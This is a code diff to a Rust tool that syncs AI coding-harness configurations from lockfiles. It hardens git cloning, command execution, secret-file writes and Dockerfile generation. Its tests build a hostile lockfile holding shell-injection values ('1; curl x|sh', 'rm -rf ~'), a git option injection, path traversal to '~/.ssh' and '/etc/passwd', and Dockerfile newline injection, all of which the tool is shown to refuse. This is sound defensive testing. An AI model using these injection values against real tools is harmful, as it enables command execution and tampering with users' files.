-            let tmp = std::env::temp_dir().join(format!("hlock-skill-{}-{}", std::process::id(), crate::hash::sha256_hex(url.as_bytes()).get(..8).unwrap_or("x")));
-            let _ = std::fs::remove_dir_all(&tmp);
-            let t = Duration::from_secs(600);
-            let s = |a: &[&str]| a.iter().map(|x| x.to_string()).collect::<Vec<_>>();
-            run_capture(&git, &s(&["clone", "--quiet", url, &tmp.to_string_lossy()]), ctx, t).ok_or_else(|| Error::Profile(format!("git clone {url} failed")))?;
-            run_capture(&git, &s(&["-C", &tmp.to_string_lossy(), "checkout", "--quiet", commit]), ctx, t).ok_or_else(|| Error::Profile(format!("git checkout {commit} failed")))?;
-            let src = tmp.join(subpath);
-            if !src.join("SKILL.md").is_file() {
+            if let Some(why) = git_source_problem(url, commit, subpath) {
+                return Err(Error::Lockfile(why));
+            }
+            let bin = ctx.which("git").ok_or_else(|| Error::Profile("git isn't on PATH".into()))?;
+            let tmp = TempDir::new("skill")?;
+            let clone = tmp.0.join("repo");
+            let clone_s = clone.to_string_lossy().into_owned();
+            git(&bin, &["-c", "protocol.ext.allow=never", "-c", "protocol.file.allow=never", "clone", "--quiet", "--", url, &clone_s], ctx)?;
+            git(&bin, &["-C", &clone_s, "checkout", "--quiet", "--detach", commit, "--"], ctx)?;
+            // a full hash names exactly one commit: check that's what was checked out
+            if matches!(commit.len(), 40 | 64) && commit.chars().all(|c| c.is_ascii_hexdigit()) {
+                let head = git(&bin, &["-C", &clone_s, "rev-parse", "HEAD"], ctx)?;
+                if !head.trim().eq_ignore_ascii_case(commit) {
+                    return Err(Error::Profile(format!("{url}: checked out {} instead of {commit}", head.trim())));
+                }
+            }
+            let src = if subpath.is_empty() { clone.clone() } else { clone.join(subpath) };
+            let is_dir = std::fs::symlink_metadata(&src).is_ok_and(|m| m.is_dir());
+            if !is_dir || !fsutil::within(&clone, &src) || !std::fs::symlink_metadata(src.join("SKILL.md")).is_ok_and(|m| m.is_file()) {
                 return Err(Error::Profile(format!("{url}@{commit} has no skill at {subpath}")));
             }
             backup(to)?;
             copy_tree(&src, to)?;
-            let _ = std::fs::remove_dir_all(&tmp);
             Ok(format!("fetched into {}", to.display()))
         }
         Action::Run { argv, env } => {
-            let mut cmd = std::process::Command::new(&argv[0]);
-            cmd.args(&argv[1..]).current_dir(&ctx.cwd).envs(env).stdin(std::process::Stdio::null());
-            let out = cmd.output().map_err(|e| Error::Profile(format!("cannot run {}: {e}", argv[0])))?;
-            let text = format!("{}{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
-            if out.status.success() {
+            let Some((bin, args)) = argv.split_first() else { return Err(Error::Profile("nothing to run: the command is empty".into())) };
+            let mut cmd = std::process::Command::new(bin);
+            // the same environment every other runner uses, plus the step's own
+            cmd.args(args).current_dir(&ctx.cwd).env_clear().envs(&ctx.env).envs(env).stdin(std::process::Stdio::null());
+            // installers may start a daemon on purpose (`ollama serve`): leave what they start
+            let limits = Limits { timeout: Some(RUN_TIMEOUT), kill_leftovers: false, ..Default::default() };
+            let out = process::run(cmd, &limits).map_err(|e| Error::Profile(format!("cannot run {bin}: {e}")))?;
+            if out.success {
                 Ok(format!("ran {}", shell_join(argv)))
             } else {
+                let text = out.text();
                 let tail: Vec<&str> = text.lines().rev().take(8).collect::<Vec<_>>().into_iter().rev().collect();
-                Err(Error::Profile(format!("`{}` exited with {}:\n{}", shell_join(argv), out.status, tail.join("\n"))))
+                let status = if out.timed_out { format!("timed out after {}s", RUN_TIMEOUT.as_secs()) } else { format!("exited with {}", out.code.map(|c| c.to_string()).unwrap_or_else(|| "a signal".into())) };
+                Err(Error::Profile(format!("`{}` {status}:\n{}", shell_join(argv), tail.join("\n"))))
             }
         }
         Action::WriteFile { path, content } => {
-            if let Some(parent) = path.parent() {
-                std::fs::create_dir_all(parent)?;
-            }
-            std::fs::write(path, content)?;
+            fsutil::write_atomic(path, content)?;
             Ok(format!("wrote {}", path.display()))
         }
         Action::WriteHooks { path, format, pointer, entries, set } => {
@@ -1245,10 +1447,8 @@ pub fn run_step(step: &Step, ctx: &Ctx) -> Result<String> {
             for (k, v) in set {
                 doc[k.as_str()] = v.clone();
             }
-            if let Some(parent) = path.parent() {
-                std::fs::create_dir_all(parent)?;
-            }
-            std::fs::write(path, render_config(&doc, format).map_err(Error::Profile)?)?;
+            // a settings file may hold secrets: written whole or not at all, keeping its mode
+            fsutil::write_atomic(path, render_config(&doc, format).map_err(Error::Profile)?)?;
             let n: usize = entries.values().filter_map(Value::as_array).map(Vec::len).sum();
             Ok(if n == 0 { format!("removed hlock's hooks from {}", path.display()) } else { format!("wrote {n} hook{} into {}", if n == 1 { "" } else { "s" }, path.display()) })
         }
@@ -1314,12 +1514,18 @@ pub fn rehydrate_skill(plan: &Plan, lock_name: &str) -> String {
     s
 }
 
+/// `s` on one line, for a Dockerfile: a newline in a value from the lock would start an
+/// instruction of its own.
+fn one_line(s: &str) -> String {
+    s.chars().map(|c| if c.is_control() { ' ' } else { c }).collect()
+}
+
 /// A Dockerfile and entrypoint for a plan built with `SyncOptions::docker`.
 /// Files the plan writes under `<context>/home` are copied to the image's home;
 /// secrets stay placeholders in the image and are filled from `-e` at start-up.
 pub fn dockerfile(plan: &Plan, lock: &Lockfile, profile: &HarnessProfile) -> (String, String) {
     let mut d = String::new();
-    d.push_str(&format!("# Generated by `hlock sync --docker` for {} {}. Rebuild after re-pinning.\n", plan.harness_name, plan.version.as_deref().unwrap_or("")));
+    d.push_str(&format!("# Generated by `hlock sync --docker` for {} {}. Rebuild after re-pinning.\n", plan.harness_name, one_line(plan.version.as_deref().unwrap_or(""))));
     d.push_str("FROM node:22-bookworm\n");
     d.push_str("RUN apt-get update && apt-get install -y --no-install-recommends ca-certificates curl git python3 && rm -rf /var/lib/apt/lists/*\n");
     d.push_str("RUN curl -LsSf https://astral.sh/uv/install.sh | env UV_INSTALL_DIR=/usr/local/bin sh\n");
@@ -1331,31 +1537,34 @@ pub fn dockerfile(plan: &Plan, lock: &Lockfile, profile: &HarnessProfile) -> (St
         .filter(|a| a[0] != "brew")
         .or_else(|| profile.install.iter().find_map(|m| install_command(&m.method, m.package.as_deref(), version, m.command.as_deref()).filter(|a| a[0] != "brew")));
     match install {
-        Some(a) if a[0] == "sh" => d.push_str(&format!("RUN {}\n", a[2])),
-        Some(a) => d.push_str(&format!("RUN {}\n", a.iter().map(|x| if x == "python3" { "uv".to_string() } else { x.clone() }).collect::<Vec<_>>().join(" ").replace("uv -m pip install", "uv pip install --system"))),
+        Some(a) if a[0] == "sh" => d.push_str(&format!("RUN {}\n", one_line(&a[2]))),
+        Some(a) => d.push_str(&format!("RUN {}\n", shell_join(&a.iter().map(|x| if x == "python3" { "uv".to_string() } else { x.clone() }).collect::<Vec<_>>()).replace("uv -m pip install", "uv pip install --system"))),
         None => d.push_str(&format!("# TODO: install {} here; hlock has no scriptable Linux install for it\n", plan.harness_name)),
     }
     for st in plan.steps.iter().filter(|s| s.kind == "plugin" && s.status == "auto") {
         if let Some(Action::Run { argv, .. }) = &st.action {
-            let cmd = if argv[0] == "sh" { argv[2].clone() } else { shell_join(argv) };
-            d.push_str(&format!("RUN {cmd} || echo 'warning: {} failed'\n", st.id.replace('\'', "")));
+            let cmd = match argv.as_slice() {
+                [sh, _, c] if sh == "sh" => c.clone(),
+                _ => shell_join(argv),
+            };
+            d.push_str(&format!("RUN {} || echo {}\n", one_line(&cmd), fsutil::shell_quote(&format!("warning: {} failed", one_line(&st.id)))));
         }
     }
     for st in plan.steps.iter().filter(|s| s.kind == "package") {
         if let Some(c) = &st.command {
-            d.push_str(&format!("RUN {}\n", c.replace("uv pip install", "uv pip install --system").replace("python3 -m pip install", "uv pip install --system")));
+            d.push_str(&format!("RUN {}\n", one_line(&c.replace("uv pip install", "uv pip install --system").replace("python3 -m pip install", "uv pip install --system"))));
         }
     }
     d.push_str("COPY home/ /root/\n");
     d.push_str("COPY hlock-entrypoint /usr/local/bin/hlock-entrypoint\n");
     for rt in lock.runtime.iter().filter(|r| r.location == "local") {
         if let Some((_, Some(port))) = rt.endpoint.as_deref().and_then(host_port) {
-            d.push_str(&format!("# {} runs on the host: point the harness at http://host.docker.internal:{port}\n", rt.name));
+            d.push_str(&format!("# {} runs on the host: point the harness at http://host.docker.internal:{port}\n", one_line(&rt.name)));
         }
     }
     let secrets: Vec<&str> = plan.steps.iter().filter(|s| s.kind == "secret").map(|s| s.id.trim_start_matches("secret:")).collect();
     if !secrets.is_empty() {
-        d.push_str(&format!("# Secrets (pass with -e): {}\n", secrets.join(" ")));
+        d.push_str(&format!("# Secrets (pass with -e): {}\n", one_line(&secrets.join(" "))));
     }
     d.push_str("WORKDIR /workspace\nENTRYPOINT [\"/usr/local/bin/hlock-entrypoint\"]\n");
     let bin = profile.binaries.first().cloned().unwrap_or_else(|| "bash".into());
@@ -1384,8 +1593,13 @@ for p in pathlib.Path.home().rglob("*"):
             continue
         new = pat.sub(lambda m: value(m.group(1)) or m.group(0), text)
         if new != text:
-            p.write_text(new)
-            p.chmod(0o600)
+            # secret values: a new file that is the owner's only from the start, then a rename
+            tmp = p.with_name(f".{p.name}.hlock-tmp")
+            tmp.unlink(missing_ok=True)
+            fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+            with os.fdopen(fd, "w") as f:
+                f.write(new)
+            os.replace(tmp, p)
 PY
 exec "$@"
 "#
@@ -1447,5 +1661,190 @@ mod tests {
     #[test]
     fn parse_jsonc_vendored() {
         assert!(parse_config("{\"a\": 1,}", "jsonc").is_ok());
+    }
+
+    // ----------------------------------------------------------------------- //
+    // A lock from someone else (`hlock pull`): what sync refuses to do for it
+    // ----------------------------------------------------------------------- //
+
+    use crate::lockfile::{Decider, Harness, Instructions, Native, Skill};
+
+    fn sandbox(tag: &str) -> (PathBuf, Ctx) {
+        let dir = std::env::temp_dir().join(format!("hlock-sync-{tag}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(dir.join("home")).unwrap();
+        std::fs::create_dir_all(dir.join("proj")).unwrap();
+        let ctx = Ctx { home: dir.join("home"), cwd: dir.join("proj"), env: BTreeMap::from([("PATH".to_string(), "/usr/bin:/bin".to_string())]), path: vec![] };
+        (dir, ctx)
+    }
+
+    fn vendor(ctx: &Ctx, rel: &str, text: &str) {
+        let p = ctx.cwd.join(rel);
+        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
+        std::fs::write(p, text).unwrap();
+    }
+
+    fn step<'a>(plan: &'a Plan, id: &str) -> &'a Step {
+        plan.steps.iter().find(|s| s.id == id).unwrap_or_else(|| panic!("no step {id}: {:?}", plan.steps.iter().map(|s| &s.id).collect::<Vec<_>>()))
+    }
+
+    fn hostile_lock() -> Lockfile {
+        let skill = |name: &str, path: &str| Skill { name: name.into(), origin: "local".into(), path: Some(path.into()), vendored: Some(".hlock/vendor/s".into()), enabled: true, ..Default::default() };
+        Lockfile {
+            harness: Harness { name: "claude-code".into(), version: Some("1; curl x|sh".into()), source: Some("script@1".into()), ..Default::default() },
+            instructions: vec![
+                Instructions { name: "~/.zshrc".into(), digest: None, scope: "user".into(), vendored: Some(".hlock/vendor/rc".into()) },
+                Instructions { name: "{root}/settings.json".into(), digest: None, scope: "user".into(), vendored: Some(".hlock/vendor/rc".into()) },
+                Instructions { name: "{root}/CLAUDE.md".into(), digest: None, scope: "user".into(), vendored: Some("../../etc/passwd".into()) },
+                Instructions { name: "CLAUDE.md".into(), digest: None, scope: "project".into(), vendored: Some(".hlock/vendor/rc".into()) },
+            ],
+            skill: vec![
+                skill("../evil", "{root}/skills/evil"),
+                skill("ssh", "~/.ssh"),
+                skill("up", "{root}/skills/../../../.bashrc"),
+                skill("fine", "{root}/skills/fine"),
+                Skill { name: "git".into(), origin: "third-party".into(), path: Some("{root}/skills/git".into()), source: Some("git+https://h.example/r@éééééééééééé#path=s".into()), enabled: true, ..Default::default() },
+                Skill { name: "opt".into(), origin: "third-party".into(), path: Some("{root}/skills/opt".into()), source: Some("git+--upload-pack=touch X@abc#path=s".into()), enabled: true, ..Default::default() },
+            ],
+            decider: vec![
+                Decider { use_: "approve".into(), provider: "ollama".into(), model: "kev:4b".into(), runtime: Some("sh".into()), via: "hook".into(), ..Default::default() },
+                Decider { use_: "stop".into(), provider: "ollama".into(), model: "kev:4b; rm -rf ~".into(), runtime: Some("ollama".into()), via: "hook".into(), ..Default::default() },
+                Decider { use_: "route".into(), provider: "ollama".into(), model: "kev:4b".into(), runtime: Some("ollama".into()), via: "hook".into(), ..Default::default() },
+            ],
+            ..Default::default()
+        }
+    }
+
+    #[test]
+    fn a_hostile_lock_gets_manual_steps_not_writes() {
+        let (_dir, ctx) = sandbox("hostile");
+        vendor(&ctx, ".hlock/vendor/rc", "export PATH=/evil:$PATH\n");
+        vendor(&ctx, ".hlock/vendor/s/SKILL.md", "---\nname: x\n---\n");
+        let lock = hostile_lock();
+        let reg = Registry::builtin();
+        let opts = SyncOptions { in_place: true, pull: true, install: true, ..Default::default() };
+        let plan = plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &opts).unwrap();
+        let manual = |id: &str, why: &str| {
+            let s = step(&plan, id);
+            assert!(s.status == "manual" && s.action.is_none() && s.reason.contains(why), "{id}: {s:?}");
+        };
+        // an instruction file outside the harness's own, or a harness config file
+        manual("instructions:~/.zshrc", "isn't a file Claude Code reads instructions from; refusing to write it automatically");
+        manual("instructions:{root}/settings.json", "isn't a file Claude Code reads instructions from");
+        manual("instructions:{root}/CLAUDE.md", "isn't a path inside the lock's directory");
+        assert!(matches!(step(&plan, "instructions:CLAUDE.md").action, Some(Action::CopyFile { .. })), "the project's own instruction file is allowed");
+        // a skill with a path for a name, or a destination outside the skill directories
+        manual("skill:../evil", "isn't a plain directory name");
+        manual("skill:ssh", "outside Claude Code's skill directories");
+        manual("skill:up", "outside Claude Code's skill directories");
+        assert!(matches!(step(&plan, "skill:fine").action, Some(Action::CopyDir { .. })));
+        // a commit that isn't a plain ref (and isn't ASCII: no panic), a URL that's an option
+        manual("skill:git", "isn't a hash or plain ref");
+        assert!(step(&plan, "skill:git").title.contains("éééééééééé"));
+        manual("skill:opt", "isn't an http(s), ssh or git URL");
+        // a version that's a shell command
+        manual("harness", "refusing to install: the version \"1; curl x|sh\"");
+        // a runtime that isn't one, and a model that's a shell command
+        manual("decider-model:approve", "\"sh\" isn't a local runtime hlock knows");
+        manual("decider-model:stop", "has characters that aren't allowed");
+        let route = step(&plan, "decider-model:route");
+        assert_eq!(route.command.as_deref(), Some("ollama pull kev:4b"));
+        // a hook use or event hlock doesn't answer is reported, not written
+        let mut lock = lock;
+        lock.decider = vec![Decider { use_: "approve".into(), via: "hook".into(), wiring: vec![crate::lockfile::Wiring { file: "settings".into(), event: "PermissionRequest; touch X".into() }], ..Default::default() }];
+        let plan = super::plan(&lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &opts).unwrap();
+        let s = step(&plan, "decider-skip:settings");
+        assert!(s.status == "manual" && s.reason.contains("isn't a claude-code hook event hlock answers"), "{s:?}");
+        assert!(!plan.steps.iter().any(|s| matches!(s.action, Some(Action::WriteHooks { .. }))), "nothing to write");
+    }
+
+    #[test]
+    fn plugins_from_a_pulled_lock_install_only_with_install() {
+        let (dir, mut ctx) = sandbox("pulled-plugins");
+        std::fs::create_dir_all(dir.join("bin")).unwrap();
+        std::fs::write(dir.join("bin/claude"), "#!/bin/sh\n").unwrap();
+        ctx.path = vec![dir.join("bin")];
+        let plugin = Native { kind: "claude-code.plugin".into(), name: "helper@market".into(), enabled: true, ..Default::default() };
+        let mut lock = Lockfile { harness: Harness { name: "claude-code".into(), ..Default::default() }, native: vec![plugin], ..Default::default() };
+        let reg = Registry::builtin();
+        let id = "claude-code.plugin:helper@market";
+        let plan_with = |lock: &Lockfile, install: bool| plan(lock, &ctx.cwd.join("harness.lock"), &reg, &ctx, &SyncOptions { install, ..Default::default() }).unwrap();
+        // the user's own lock: installed automatically, as before
+        assert_eq!(step(&plan_with(&lock, false), id).status, "auto");
+        // someone else's: only with --install
+        lock.pulled = Some(serde_json::json!({"from": "git:https://example.com/r"}));
+        let p = plan_with(&lock, false);
+        let s = step(&p, id);
+        assert!(s.status == "manual" && s.action.is_none() && s.reason.contains("--install"), "{s:?}");
+        assert_eq!(step(&plan_with(&lock, true), id).status, "auto");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn install_values_are_plain_and_quoted() {
+        assert!(install_command("script", None, Some("1; curl x|sh"), Some("curl x | bash -s {version}")).is_none());
+        assert!(install_command("npm", Some("--registry=evil"), None, None).is_none());
+        assert!(install_values_problem(Some("@scope/pkg"), Some("2.1.0")).is_none());
+        assert_eq!(install_command("script", None, Some("2.1+b"), Some("sh -s {version}")).unwrap()[2], "sh -s 2.1+b");
+    }
+
+    #[test]
+    fn model_pulls_refuse_ids_that_are_shell() {
+        let (_dir, ctx) = sandbox("pull");
+        let reg = Registry::builtin();
+        let rt = Runtime { name: "vllm".into(), location: "local".into(), model: vec![crate::lockfile::RuntimeModel { id: "org/m".into(), revision: Some("main; touch X".into()), ..Default::default() }], ..Default::default() };
+        let used = BTreeSet::from([("vllm".to_string(), "org/m".to_string())]);
+        let steps = runtime_steps(&rt, &used, &reg, &ctx, &SyncOptions { pull: true, ..Default::default() }, false);
+        let s = steps.iter().find(|s| s.kind == "model").unwrap();
+        assert!(s.status == "manual" && s.action.is_none() && s.command.is_none() && s.reason.contains("refusing to pull: the revision"), "{s:?}");
+    }
+
+    #[test]
+    fn running_steps_checks_what_it_runs() {
+        let (dir, mut ctx) = sandbox("run");
+        let run = |argv: &[&str], ctx: &Ctx| run_step(&Step { action: Some(Action::Run { argv: argv.iter().map(|s| s.to_string()).collect(), env: BTreeMap::new() }), ..Default::default() }, ctx);
+        assert!(run(&[], &ctx).unwrap_err().to_string().contains("the command is empty"));
+        // the context's environment, not the process's
+        ctx.env.insert("HLOCK_SYNC_T".into(), "yes".into());
+        assert!(run(&["sh", "-c", "test \"$HLOCK_SYNC_T\" = yes && test -z \"$CARGO\""], &ctx).is_ok());
+        assert!(run(&["sh", "-c", "exit 3"], &ctx).unwrap_err().to_string().contains("exited with 3"));
+        // a git source that's an option is refused before git runs
+        let to = dir.join("skill");
+        let st = Step { action: Some(Action::GitSkill { url: "--upload-pack=touch X".into(), commit: "abc".into(), subpath: String::new(), to }), ..Default::default() };
+        assert!(run_step(&st, &ctx).is_err() && !ctx.cwd.join("X").exists());
+        let st = Step { action: Some(Action::GitSkill { url: "https://h.example/r".into(), commit: "abc".into(), subpath: "/etc".into(), to: dir.join("s2") }), ..Default::default() };
+        assert!(run_step(&st, &ctx).unwrap_err().to_string().contains("isn't relative"));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn configs_with_secrets_are_private_from_the_start() {
+        use std::os::unix::fs::PermissionsExt;
+        let (dir, mut ctx) = sandbox("private");
+        ctx.env.insert("HLOCK_SECRET_X".into(), "s3cret".into());
+        std::fs::write(dir.join("v.json"), "{\"apiKey\": \"${HLOCK_SECRET_X}\"}").unwrap();
+        let target = dir.join("settings.json");
+        std::fs::write(&target, "{\"apiKey\": \"old\"}").unwrap();
+        std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o644)).unwrap();
+        let st = Step { action: Some(Action::WriteConfig { path: target.clone(), vendored: dir.join("v.json"), format: "json".into(), pointers: vec![], fallback: None, env_ref: None }), ..Default::default() };
+        run_step(&st, &ctx).unwrap();
+        let mode = |p: &Path| std::fs::metadata(p).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode(&target), 0o600);
+        assert_eq!(mode(&dir.join("settings.json.hlock-bak")), 0o600);
+        assert!(std::fs::read_to_string(&target).unwrap().contains("s3cret"));
+    }
+
+    #[test]
+    fn dockerfiles_keep_lock_values_on_one_line() {
+        let reg = Registry::builtin();
+        let profile = reg.harness("claude-code").unwrap();
+        let lock = Lockfile {
+            runtime: vec![Runtime { name: "x\nRUN curl evil | sh".into(), location: "local".into(), endpoint: Some("http://localhost:11434".into()), ..Default::default() }],
+            harness: Harness { name: "claude-code".into(), version: Some("2.1\nRUN evil".into()), ..Default::default() },
+            ..Default::default()
+        };
+        let (d, entry) = dockerfile(&Plan { harness_name: "Claude Code".into(), version: lock.harness.version.clone(), ..Default::default() }, &lock, profile);
+        assert!(!d.lines().any(|l| l.starts_with("RUN curl evil") || l.starts_with("RUN evil")), "{d}");
+        assert!(entry.contains("os.O_EXCL, 0o600") && !entry.contains("chmod"));
     }
 }
